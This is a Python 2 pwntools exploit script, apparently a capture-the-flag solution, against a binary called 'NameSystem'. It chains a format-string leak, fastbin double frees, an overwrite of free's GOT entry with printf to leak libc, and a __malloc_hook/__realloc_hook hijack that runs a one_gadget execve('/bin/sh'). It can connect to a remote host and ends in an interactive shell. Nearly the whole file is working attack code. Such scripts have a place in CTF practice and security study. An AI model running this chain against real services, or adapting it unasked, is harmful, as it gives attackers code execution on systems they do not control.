#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *
import sys
import os
debug = 1
exe = "./NameSystem"

r = lambda x:io.recv(x)
ru = lambda x:io.recvuntil(x)
rud = lambda x:io.recvuntil(x,drop=True)
rul = lambda:io.recvline()
sd = lambda x:io.send(x)
sl = lambda x:io.sendline(x)
sea = lambda x,y:io.sendafter(x,y)
sela = lambda x,y:io.sendlineafter(x,y)

context.terminal = ["tmux","splitw","-h"]
elf = ELF(exe)
context.arch = elf.arch

if debug:
    context.log_level = "debug"

arena64 = 0x3c4b20
arena32 = 0x1b2780

def pre(libc_version):
    glibc_dir = '/glibc/{arch}/{libc}/lib/libc-{libc}.so'.format(arch=elf.arch,libc=str(libc_version))
    ld_dir = '/glibc/{arch}/{libc}/lib/ld-{libc}.so'.format(arch=elf.arch,libc=str(libc_version))
    if libc_version==0:
        io = process(exe)
        return io
    else:
        io = process(exe,env={"LD_PRELOAD":glibc_dir})
        cmd = "patchelf --set-interpreter {} {}".format(ld_dir,os.getcwd()+"/"+exe)
        os.system(cmd)
        return io
 
def dbg(breakpoint=0):
    elf_base = int(os.popen('pmap {}| awk \x27{{print \x241}}\x27'.format(io.pid)).readlines()[1], 16)if elf.pie else 0 
    if breakpoint!=0:
        gdbscript = 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
        gdb.attach(io, gdbscript)
        time.sleep(1)
    else:
        cmd = "b *realloc\nb *malloc\nb *0x400A0E\n "
        gdb.attach(io,cmd)

if len(sys.argv)>1:
    io = remote(sys.argv[1],int(sys.argv[2]))
    #libc = ELF("./libc.so.6")
else:
    io = pre(0)
    libc = elf.libc

def new(size,con,line=1):
    sela(":\n","1")
    sela(":",str(size))
    if line==1:
        sela(":",str(con))
    else:
        sea(":",str(con))

def de(ind):
    sela(":\n","3")
    sela(":",str(ind))

for i in range(17):
    new(0x10,"%13$p")
for i in range(3):
    new(0x50,"bbb")
de(18)
de(18)
de(17)
de(19)

# 17 18 处都存放着19的地址，因此需要整体前移两位
de(0)
de(0)
# 创造0x60 的fastbin attack 环境
new(0x60,"xxx") #17
new(0x60,"xxx") #18
new(0x60,"xxx") #19

de(18)
de(18)
de(17)
de(19)

'''
0x60: 0x11982e0 —▸ 0x1198220 ◂— 0x11982e0
0x70: 0x1198420 —▸ 0x1198340 ◂— 0x1198420
'''
# clean 
for i in range(5):
    de(0)

# fastbin attack to got 
tar = 0x602000+2-8
new(0x50,p64(tar))
new(0x50,"ccc")
new(0x50,"ddd")
# overwrite free_got
printf_plt = elf.plt["printf"]
new(0x50,"a"*6+p64(0)+p64(printf_plt)[:7])
de(0)

# fastbin to malloc_hook
libc.address = int(r(14),16) - libc.sym["__libc_start_main"]-240
print hex(libc.address)
one = libc.address +0xf1147
m_hook = libc.sym["__malloc_hook"]
realloc = libc.sym["realloc"]
'''
0xf1147 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''
for i in range(5):
    de(0)

# attack to malloc_hook,realloc_hook
new(0x60,p64(m_hook-0x23))
new(0x60,"aa")
new(0x60,"aa")
new(0x60,"a"*0xb+p64(one)+p64(realloc+20))

print hex(one)
new(0x10,"/bin/sh")

io.interactive()


